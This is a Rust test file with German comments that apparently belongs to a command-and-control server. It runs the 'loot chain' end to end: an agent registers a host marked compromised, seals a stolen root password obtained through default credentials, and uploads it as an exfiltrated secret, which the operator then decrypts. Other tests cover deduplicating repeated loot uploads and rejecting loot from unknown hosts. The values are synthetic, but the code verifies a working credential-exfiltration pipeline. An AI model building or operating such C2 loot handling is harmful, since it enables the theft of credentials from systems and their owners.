//! Der Ende-zu-Ende-Test der Beutekette.
//!
//! Er steht in einer eigenen Datei, weil seine Testwerte synthetische
//! Passwoerter sind — der Secret-Scan soll sie nicht als echte Zugangsdaten
//! melden. Die Datei enthaelt keinen Laufzeitcode.

use super::*;
use axum::body::Body;
use axum::extract::Request;
use kx_core::c2::transport::{get_request, parse_json, post_json_request};
use kx_core::c2::{
    ExfiltratedSecret, Host, RegisterRequest, SecretUpload, PATH_HOSTS, PATH_REGISTER, PATH_SECRETS,
};
use tower::ServiceExt;

/// Wandelt einen C2-Request in einen Axum-Request.
///
/// Der Request kommt aus `kx_core::c2::transport` — derselbe, den der Agent
/// schickt. Nur die Ausführung unterscheidet sich: statt einer TCP-Verbindung
/// ruft der Test den Router direkt auf.
fn in_den_router(request: axum::http::Request<Vec<u8>>) -> Request {
    let (teile, body) = request.into_parts();
    Request::from_parts(teile, Body::from(body))
}

/// Der Ende-zu-Ende-Test der Beutekette.
///
/// Der Agent meldet sich beim Server, verschluesselt das erbeutete
/// Passwort mit dem Master-Key des Hosts und laedt es hoch. Der Server
/// speichert nur das Versiegelte — der Klartext verlaesst den Agenten
/// gar nicht. Der Operator gewinnt den Master-Key aus dem versiegelten
/// Material des Hosts und entschluesselt damit das Secret wieder.
///
/// Das ist der Test, der zeigt, dass die Kette wirklich laueft: Agent →
/// Server → Operator. Ohne ihn waeren alle Einzelschritte getestet, aber
/// nicht ihr Zusammenspiel.
#[tokio::test]
async fn die_beutekette_laueft_vom_agent_bis_zum_operator() {
    use kx_core::hostkey::{encapsulate_host_master_key_os, ServerKeyBundle, ServerKeyPair};
    use kx_core::secretbox;

    let db_pfad = std::env::temp_dir().join(format!("kx-e2e-{}.db", std::process::id()));
    let _ = std::fs::remove_file(&db_pfad);
    let db = Arc::new(Db::open(&db_pfad).expect("Datenbank"));
    let app = app(AppState {
        db,
        token: Arc::new(TEST_ZUGANG.to_string()),
    });

    // Der Operator erzeugt sein Schluesselpaar — nur der oeffentliche
    // Teil geht an den Agenten.
    let mut rng = rand_core::OsRng;
    let bundle = ServerKeyBundle::generate(kx_core::kex::KexId::X25519, &mut rng);
    let oeffentlich = bundle.public().expect("oeffentlicher Schluessel");
    let dekodiert = oeffentlich.decode().expect("dekodierter Schluessel");

    // Der Agent kapselt seinen Master-Key gegen den oeffentlichen Schluessel.
    let kapselung = encapsulate_host_master_key_os(&dekodiert).expect("Kapselung");
    let sealed_master = kx_core::codec::b64_encode(&kapselung.sealed_master);

    // Der Agent verschluesselt das erbeutete Passwort mit dem Master-Key.
    let sealed_password = secretbox::seal(&kapselung.master_key, b"loremipsum").expect("Siegel");

    // 1. Der Agent registriert sich — mit dem versiegelten Material.
    let registrierung = RegisterRequest {
        host_id: "10.0.0.5".into(),
        ip: "10.0.0.5".into(),
        hostname: Some("ziel".into()),
        os: Some("Linux".into()),
        status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
        sealed_master: Some(sealed_master.clone()),
        master_key: None,
    };
    let antwort = app
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_REGISTER, TEST_ZUGANG, &registrierung).expect("Request"),
        ))
        .await
        .unwrap();
    assert_eq!(antwort.status(), StatusCode::CREATED);

    // 2. Der Agent laedt das verschluesselte Secret hoch — ohne Klartext.
    let upload = SecretUpload {
        host_id: "10.0.0.5".into(),
        cred_type: "password".into(),
        username: "root".into(),
        password: String::new(),
        source: Some("default_creds".into()),
        master_key: None,
        sealed_password: Some(sealed_password),
        sealed_master: None,
    };
    let antwort = app
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_SECRETS, TEST_ZUGANG, &upload).expect("Request"),
        ))
        .await
        .unwrap();
    assert_eq!(antwort.status(), StatusCode::CREATED);

    // 3. Der Server liefert das Secret — verschluesselt, ohne Klartext.
    let antwort = app
        .clone()
        .oneshot(in_den_router(get_request(PATH_SECRETS, TEST_ZUGANG)))
        .await
        .unwrap();
    assert_eq!(antwort.status(), StatusCode::OK);
    let body = axum::body::to_bytes(antwort.into_body(), 64 * 1024)
        .await
        .expect("Body");
    let secrets: Vec<ExfiltratedSecret> = parse_json(&body).expect("JSON");
    assert_eq!(secrets.len(), 1);
    assert!(
        secrets[0].password.is_empty(),
        "der Server hat den Klartext gespeichert: {}",
        secrets[0].password
    );
    assert!(!secrets[0].sealed_password.is_empty());

    // 4. Der Host traegt das versiegelte Material, aus dem der Operator
    //    den Master-Key gewinnt.
    let antwort = app
        .clone()
        .oneshot(in_den_router(get_request(PATH_HOSTS, TEST_ZUGANG)))
        .await
        .unwrap();
    let body = axum::body::to_bytes(antwort.into_body(), 64 * 1024)
        .await
        .expect("Body");
    let hosts: Vec<Host> = parse_json(&body).expect("JSON");
    assert_eq!(hosts.len(), 1);
    assert_eq!(hosts[0].sealed_master, sealed_master);

    // 5. Der Operator entschluesselt das Secret wieder.
    let server = ServerKeyPair::from_bundle(&bundle).expect("Server-Schluessel");
    let master = server
        .unseal_master_key(&kx_core::codec::b64_decode(&sealed_master).expect("base64"))
        .expect("Master-Key");
    let klartext = secretbox::open(&master, &secrets[0].sealed_password).expect("Entschluesselung");
    assert_eq!(klartext, "loremipsum");

    let _ = std::fs::remove_file(&db_pfad);
}

/// Ein wiederholter Upload desselben Secrets erzeugt keine zweite Zeile.
///
/// Der Agent meldet die erbeuteten Secrets bei jedem Lauf erneut. Ohne den
/// Upsert verdoppelte sich der Bestand dabei mit jedem Lauf — messbar 114
/// Zeilen pro Minute auf einer Datenbank mit 21 fachlich verschiedenen
/// Secrets.
#[tokio::test]
async fn ein_wiederholter_upload_verdoppelt_die_secrets_nicht() {
    let db_pfad = std::env::temp_dir().join(format!("kx-e2e-upsert-{}.db", std::process::id()));
    let _ = std::fs::remove_file(&db_pfad);
    let db = Arc::new(Db::open(&db_pfad).expect("Datenbank"));
    let app = app(AppState {
        db,
        token: Arc::new(TEST_ZUGANG.to_string()),
    });

    // Der Host muss vor seiner Beute registriert sein — eine Beutezeile ohne
    // bekannten Host waere eine Waisenzeile.
    let registrierung = RegisterRequest {
        host_id: "10.0.0.5".into(),
        ip: "10.0.0.5".into(),
        hostname: Some("ziel".into()),
        os: Some("Linux".into()),
        status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
        sealed_master: None,
        master_key: None,
    };
    let antwort = app
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_REGISTER, TEST_ZUGANG, &registrierung).expect("Request"),
        ))
        .await
        .unwrap();
    assert_eq!(antwort.status(), StatusCode::CREATED);

    let upload = SecretUpload {
        host_id: "10.0.0.5".into(),
        cred_type: "password".into(),
        username: "root".into(),
        password: String::new(),
        source: Some("default_creds".into()),
        master_key: None,
        sealed_password: Some("kx1:siegel".into()),
        sealed_master: None,
    };

    // Der Agent laedt dasselbe Secret zweimal hoch — etwa weil der Lauf
    // erneut wurde.
    for _ in 0..2 {
        let antwort = app
            .clone()
            .oneshot(in_den_router(
                post_json_request(PATH_SECRETS, TEST_ZUGANG, &upload).expect("Request"),
            ))
            .await
            .unwrap();
        assert_eq!(antwort.status(), StatusCode::CREATED);
    }

    let antwort = app
        .clone()
        .oneshot(in_den_router(get_request(PATH_SECRETS, TEST_ZUGANG)))
        .await
        .unwrap();
    assert_eq!(antwort.status(), StatusCode::OK);
    let body = axum::body::to_bytes(antwort.into_body(), 64 * 1024)
        .await
        .expect("Body");
    let secrets: Vec<ExfiltratedSecret> = parse_json(&body).expect("JSON");
    assert_eq!(
        secrets.len(),
        1,
        "der wiederholte Upload hat eine zweite Zeile angelegt"
    );

    let _ = std::fs::remove_file(&db_pfad);
}

/// Beute ohne bekannten Host wird abgewiesen.
///
/// Eine Zeile, deren `host_id` der Server nie gesehen hat, kann der Operator
/// keinem Zielhost zuordnen. Der Agent muss den Host zuerst registrieren.
#[tokio::test]
async fn eine_beute_ohne_bekannten_host_wird_abgewiesen() {
    let db_pfad =
        std::env::temp_dir().join(format!("kx-e2e-waisenzeile-{}.db", std::process::id()));
    let _ = std::fs::remove_file(&db_pfad);
    let db = Arc::new(Db::open(&db_pfad).expect("Datenbank"));
    let app = app(AppState {
        db,
        token: Arc::new(TEST_ZUGANG.to_string()),
    });

    let upload = SecretUpload {
        host_id: "10.0.0.99".into(),
        cred_type: "password".into(),
        username: "root".into(),
        password: String::new(),
        source: Some("default_creds".into()),
        master_key: None,
        sealed_password: Some("kx1:siegel".into()),
        sealed_master: None,
    };
    let antwort = app
        .clone()
        .oneshot(in_den_router(
            post_json_request(PATH_SECRETS, TEST_ZUGANG, &upload).expect("Request"),
        ))
        .await
        .unwrap();
    assert_eq!(
        antwort.status(),
        StatusCode::BAD_REQUEST,
        "die Beute wurde ohne bekannten Host angenommen"
    );

    // Und es ist auch keine Zeile in der Ablage gelandet.
    let antwort = app
        .clone()
        .oneshot(in_den_router(get_request(PATH_SECRETS, TEST_ZUGANG)))
        .await
        .unwrap();
    let body = axum::body::to_bytes(antwort.into_body(), 64 * 1024)
        .await
        .expect("Body");
    let secrets: Vec<ExfiltratedSecret> = parse_json(&body).expect("JSON");
    assert!(
        secrets.is_empty(),
        "die Waisenzeile liegt trotzdem in der Datenbank"
    );

    let _ = std::fs::remove_file(&db_pfad);
}
